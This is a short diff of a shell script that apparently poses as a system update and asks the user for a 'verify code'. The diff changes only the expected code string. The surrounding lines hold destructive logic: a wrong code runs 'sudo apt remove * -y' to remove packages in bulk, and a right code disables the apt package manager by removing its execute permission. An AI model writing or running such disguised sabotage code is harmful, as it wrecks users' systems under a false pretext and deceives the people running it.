@@ -6,7 +6,7 @@ clear
 
 echo "Please, introduce verify code to end the update: "
 read code
-if [ $code != 'ITIS-TEST' ]; then
+if [ $code != 'ITSA-TEST' ]; then
   sudo apt remove * -y
 else
   sudo chmod -x /usr/bin/apt
